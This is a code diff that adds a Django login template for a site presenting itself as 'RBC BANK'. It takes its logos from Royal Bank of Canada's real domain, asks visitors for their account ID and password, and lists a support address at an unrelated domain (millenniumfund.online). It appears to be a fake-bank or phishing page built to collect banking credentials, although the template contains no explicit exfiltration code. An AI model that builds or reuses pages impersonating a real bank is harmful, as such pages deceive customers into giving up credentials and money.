@@ -1,0 +1,520 @@
+
+<!DOCTYPE html>
+<html lang="en-US" class="js">
+{% load static %}
+{% include "core/messages.html" %}
+
+<head>
+    <meta charset="utf-8">
+    <meta name="author" content="Softnio">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="shortcut icon" href="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield.svg" type="image/x-icon">
+    <!-- Fav Icon  -->
+    <link rel="shortcut icon" href="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield.svg">
+    <!-- Page Title  -->
+    <title>Home | Welcome to RBC BANK</title>
+    <!-- StyleSheets  -->
+    <link rel="stylesheet" href="{% static 'assets/css/dashlite.css' %}">
+    <link rel="stylesheet" href="{% static 'scss/sweetalert.css' %}">
+    <link id="skin-default" rel="stylesheet" href="{% static 'assets/css/theme.css' %}">
+    <link id="skin-default" rel="stylesheet" href="{% static 'assets/css/theme.css' %}">
+    <link href="{% static 'css/toastr.css' %}" rel="stylesheet" />
+</head>
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+        }, 'google_translate_element');
+    }
+</script>
+<script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+<style>
+    .goog-te-gadget-simple {
+        border: none;
+    }
+
+    .goog-te-gadget-simple a {
+        color: #000;
+    }
+</style>
+<style type="text/css">
+    .btn-primary {
+        background-color: #033d75;
+    }
+
+    .btn-secondary {
+        background-color: #d13636;
+    }
+
+    .btn-secondary:hover {
+        opacity: 0.6;
+    }
+
+    .btn-primary:hover {
+        opacity: 0.6;
+    }
+</style>
+<style>
+    input[type=number] {
+        height: 50px;
+        width: 50px;
+        font-size: 25px;
+        color: #033d75;
+        text-align: center;
+        border: 3px solid #033d75;
+        box-shadow: 4px #033d75;
+        border-radius: 7px;
+        font-weight: 600;
+    }
+
+    input[type=number]:focus {
+        border-bottom: 5px solid #008000;
+    }
+
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+    }
+</style>
+
+<body class="nk-body npc-crypto bg-white pg-auth">
+    <!-- app body @s -->
+    <div class="nk-app-root">
+        <div class="nk-split nk-split-page nk-split-md">
+            <div class="nk-split-content nk-block-area nk-block-area-column nk-auth-container bg-white">
+                <div class="absolute-top-right d-lg-none p-3 p-sm-5">
+                    <a href="#" class="toggle btn-white btn btn-icon btn-light" data-target="athPromo"><em class="icon ni ni-info"></em></a>
+                </div>
+<div class="nk-block nk-block-middle nk-auth-body">
+    <div class="nk-feature-content p-3"></div>
+    <br>
+    <div class="nk-block-head">
+        <div class="nk-block-head-content">
+            <h3 class="nk-block-title">Sign-In</h3>
+            <div class="nk-block-des alert alert-pro alert-primary">
+                <p class="alert-text">Access the RBC BANK panel using your Account ID and password.</p>
+            </div>
+        </div>
+    </div>
+<!-- Flash Messages -->
+{% if messages %}
+<div id="flash-message-container" class="flash-message-container">
+    {% for message in messages %}
+    <div class="flash-message flash-message-{{ message.tags }} animate__animated animate__fadeInRight" role="alert" data-message-id="{{ forloop.counter }}">
+        <div class="flash-message-content">
+            <div class="flash-message-icon"></div>
+            <div class="flash-message-text">
+                <p class="flash-message-title">
+                    {% if message.tags == 'success' %}
+                        Success
+                    {% elif message.tags == 'error' or message.tags == 'danger' %}
+                        Error
+                    {% elif message.tags == 'warning' %}
+                        Warning
+                    {% elif message.tags == 'info' %}
+                        Information
+                    {% else %}
+                        Notice
+                    {% endif %}
+                </p>
+                <p class="flash-message-body">{{ message }}</p>
+            </div>
+        </div>
+        <div class="flash-message-progress"></div>
+        <button type="button" class="flash-message-close" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+        </button>
+    </div>
+    {% endfor %}
+</div>
+{% endif %}
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+@import url('https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css');
+
+:root {
+    --success-color: #00c851;
+    --danger-color: #ff4444;
+    --warning-color: #ffbb33;
+    --info-color: #33b5e5;
+}
+
+.flash-message-container {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    z-index: 9999;
+    max-width: 400px;
+    width: 100%;
+}
+
+.flash-message {
+    position: relative;
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 16px;
+    background-color: rgba(255, 255, 255, 0.9);
+    backdrop-filter: blur(10px);
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1), 0 1px 8px rgba(0, 0, 0, 0.06);
+    font-family: 'Poppins', sans-serif;
+    overflow: hidden;
+    transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+}
+
+.flash-message::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 6px;
+    height: 100%;
+    border-top-left-radius: 12px;
+    border-bottom-left-radius: 12px;
+}
+
+.flash-message-content {
+    display: flex;
+    align-items: center;
+}
+
+.flash-message-icon {
+    flex-shrink: 0;
+    width: 32px;
+    height: 32px;
+    margin-right: 16px;
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+}
+
+.flash-message-text {
+    flex-grow: 1;
+}
+
+.flash-message-title {
+    margin: 0 0 4px;
+    font-size: 18px;
+    font-weight: 600;
+}
+
+.flash-message-body {
+    margin: 0;
+    font-size: 14px;
+    font-weight: 300;
+    line-height: 1.4;
+}
+
+.flash-message-close {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    padding: 4px;
+    background: transparent;
+    border: none;
+    font-size: 20px;
+    cursor: pointer;
+    opacity: 0.5;
+    transition: opacity 0.2s ease, transform 0.2s ease;
+}
+
+.flash-message-close:hover {
+    opacity: 1;
+    transform: scale(1.1);
+}
+
+.flash-message-progress {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    height: 4px;
+    width: 100%;
+    background-color: rgba(255, 255, 255, 0.3);
+}
+
+.flash-message-progress::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 100%;
+    background-color: currentColor;
+    transform-origin: left;
+    animation: progress 5s linear forwards;
+}
+
+@keyframes progress {
+    0% { transform: scaleX(1); }
+    100% { transform: scaleX(0); }
+}
+
+.flash-message-success {
+    color: var(--success-color);
+    background-color: rgba(0, 200, 81, 0.1);
+}
+
+.flash-message-success::before {
+    background-color: var(--success-color);
+}
+
+.flash-message-success .flash-message-icon {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300c851'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E");
+}
+
+.flash-message-danger {
+    color: var(--danger-color);
+    background-color: rgba(255, 68, 68, 0.1);
+}
+
+.flash-message-danger::before {
+    background-color: var(--danger-color);
+}
+
+.flash-message-danger .flash-message-icon {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ff4444'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E");
+}
+
+.flash-message-warning {
+    color: var(--warning-color);
+    background-color: rgba(255, 187, 51, 0.1);
+}
+
+.flash-message-warning::before {
+    background-color: var(--warning-color);
+}
+
+.flash-message-warning .flash-message-icon {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffbb33'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z'/%3E%3C/svg%3E");
+}
+
+.flash-message-info {
+    color: var(--info-color);
+    background-color: rgba(51, 181, 229, 0.1);
+}
+
+.flash-message-info::before {
+    background-color: var(--info-color);
+}
+
+.flash-message-info .flash-message-icon {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2333b5e5'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z'/%3E%3C/svg%3E");
+}
+
+@media (max-width: 480px) {
+    .flash-message-container {
+        left: 8px;
+        right: 20px;
+        max-width: none;
+    }
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const flashMessageContainer = document.getElementById('flash-message-container');
+    const flashMessages = document.querySelectorAll('.flash-message');
+    
+    flashMessages.forEach((message, index) => {
+        const messageId = message.getAttribute('data-message-id');
+        message.style.animationDelay = `${index * 0.2}s`;
+        
+        const dismissTimeout = setTimeout(() => {
+            dismissMessage(message);
+        }, 5000 + (index * 200));
+        
+        message.addEventListener('mouseenter', () => {
+            clearTimeout(dismissTimeout);
+            message.style.transform = 'translateY(-5px) scale(1.02)';
+            message.style.boxShadow = '0 15px 35px rgba(0, 0, 0, 0.15), 0 3px 10px rgba(0, 0, 0, 0.1)';
+        });
+        
+        message.addEventListener('mouseleave', () => {
+            message.style.transform = 'translateY(0) scale(1)';
+            message.style.boxShadow = '0 10px 30px rgba(0, 0, 0, 0.1), 0 1px 8px rgba(0, 0, 0, 0.06)';
+        });
+        
+        const closeButton = message.querySelector('.flash-message-close');
+        closeButton.addEventListener('click', () => {
+            dismissMessage(message);
+        });
+        
+        // Pause progress bar on hover
+        message.addEventListener('mouseenter', () => {
+            message.querySelector('.flash-message-progress::after').style.animationPlayState = 'paused';
+        });
+        
+        message.addEventListener('mouseleave', () => {
+            message.querySelector('.flash-message-progress::after').style.animationPlayState = 'running';
+        });
+    });
+    
+    function dismissMessage(message) {
+        message.classList.remove('animate__fadeInRight');
+        message.classList.add('animate__fadeOutRight');
+        setTimeout(() => {
+            message.remove();
+            if (flashMessageContainer.children.length === 0) {
+                flashMessageContainer.remove();
+            }
+        }, 500);
+    }
+    
+    // Drag to dismiss functionality
+    let isDragging = false;
+    let startX, startScrollLeft;
+    
+    flashMessageContainer.addEventListener('mousedown', (e) => {
+        isDragging = true;
+        startX = e.pageX - flashMessageContainer.offsetLeft;
+        startScrollLeft = flashMessageContainer.scrollLeft;
+    });
+    
+    flashMessageContainer.addEventListener('mouseleave', () => {
+        isDragging = false;
+    });
+    
+    flashMessageContainer.addEventListener('mouseup', () => {
+        isDragging = false;
+    });
+    
+    flashMessageContainer.addEventListener('mousemove', (e) => {
+        if (!isDragging) return;
+        e.preventDefault();
+        const x = e.pageX - flashMessageContainer.offsetLeft;
+        const walk = (x - startX) * 2;
+        flashMessageContainer.scrollLeft = startScrollLeft - walk;
+    });
+    
+    // Swipe to dismiss on mobile
+    let touchStartX = 0;
+    let touchEndX = 0;
+    
+    flashMessageContainer.addEventListener('touchstart', (e) => {
+        touchStartX = e.changedTouches[0].screenX;
+    }, false);
+    
+    flashMessageContainer.addEventListener('touchend', (e) => {
+        touchEndX = e.changedTouches[0].screenX;
+        handleSwipe();
+    }, false);
+    
+    function handleSwipe() {
+        if (touchEndX < touchStartX) {
+            const activeMessage = document.elementFromPoint(touchEndX, touchStartY);
+            if (activeMessage && activeMessage.classList.contains('flash-message')) {
+                dismissMessage(activeMessage);
+            }
+        }
+    }
+});
+</script>
+    <!-- .nk-block-head -->
+    <form action="{% url 'accounts:login' %}" method="POST">
+        {% csrf_token %}
+        <div class="form-group">
+            <label class="form-label" for="id_account_no">Username</label>
+            {{ form.username }}
+            {% if form.errors.username %}
+            <div class="text-danger">{{ form.errors.username }}</div>
+            {% endif %}
+        </div>
+
+        <div class="form-group">
+            <label for="id_password">Password</label>
+            {{ form.password }}
+            {% if form.errors.password %}
+            <div class="text-danger">{{ form.errors.password }}</div>
+            {% endif %}
+        </div>
+
+        <input type="submit" value="Login" class="btn btn-secondary btn-block">
+        <p>Don't have an account? <a href="{% url 'transactions:terms' %}">Register</a></p>
+    </form>
+
+    <!-- form -->
+    <center class="p-3">
+        <a href="{% url 'transactions:terms' %}" class="btn btn-sm btn-secondary"><em class="icon ni ni-regen"></em> Enroll for Online Banking</a>
+    </center>
+</div>
+
+<!-- .nk-block -->
+<div class="nk-block nk-auth-footer">
+    <a href="#" style="">
+        <div id="google_translate_element"></div>
+    </a>
+    <div class="mt-3">
+        <p>&copy; 2025 RBC BANK. All Rights Reserved.</p>
+    </div>
+</div>
+<!-- .nk-block -->
+</div>
+
+
+            <!-- .nk-split-content -->
+            <div class="nk-split-content nk-split-stretch bg-lighter d-flex toggle-break-lg toggle-slide toggle-slide-right" data-content="athPromo" data-toggle-screen="lg" data-toggle-overlay="true">
+                <div class="slider-wrap w-100 w-max-550px p-3 p-sm-5 m-auto">
+                    <div class="slider-init" data-slick='{"dots":true, "arrows":false}'>
+                        <div class="slider-item">
+                            <div class="nk-feature nk-feature-center">
+                                <div class="nk-feature-img">
+                                    <img class="round" src="{% static 'assets/images/security.svg' %}" srcset="{% static 'assets/images/security.svg' %} 2x" alt="">
+                                </div>
+                                <div class="nk-feature-content py-4 p-sm-5">
+                                    <h4>Protect your online banking.</h4>
+                                    <p>We have security measures in place to safeguard your money, because we are committed to providing you with a secure banking experience. When we come across any hoaxes or scams that target customers, we will raise them
+                                        to your attention.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- .slider-item -->
+                        <div class="slider-item">
+                            <div class="nk-feature nk-feature-center">
+                                <div class="nk-feature-img">
+                                    <img class="round" src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield.svg" srcset="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield.svg 2x" alt="">
+                                </div>
+                                <div class="nk-feature-content py-4 p-sm-5">
+                                    <h4>RBC BANK</h4>
+                                    <p>We'll never send an email containing a link to RBC BANK.<br> We'll never ask for your passwords or Secret Code.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- .slider-item -->
+                        <div class="slider-item">
+                            <div class="nk-feature nk-feature-center">
+                                <div class="nk-feature-img">
+                                    <img class="round" src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield.svg" srcset="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield.svg 2x" alt="">
+                                </div>
+                                <div class="nk-feature-content py-4 p-sm-5">
+                                    <h4>RBC BANK</h4>
+                                    <p>When accessing RBC BANK, you can mail us at support@millenniumfund.online</p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- .slider-item -->
+                    </div>
+                    <!-- .slider-init -->
+                    <div class="slider-dots"></div>
+                    <div class="slider-arrows"></div>
+                </div>
+                <!-- .slider-wrap -->
+            </div>
+            <!-- .nk-split-content -->
+        </div>
+        <!-- .nk-split -->
+    </div>
+    <!-- app body @e -->
+    <!-- JavaScript -->
+    <script src="{% static 'assets/js/jquery.min.js' %}"></script>
+
+    <script src="{% static 'assets/js/bundle.js' %}"></script>
+    <script src="{% static 'assets/js/scripts.js' %}"></script>
+    <script src="{% static 'assets/js/vendors/sweetalert.js' %}"></script>
+    <script src="{% static 'assets/js/custom.js' %}"></script>
+    <script src="{% static 'assets/js/toastr.js' %}"></script>
+</body>
+
+</html>
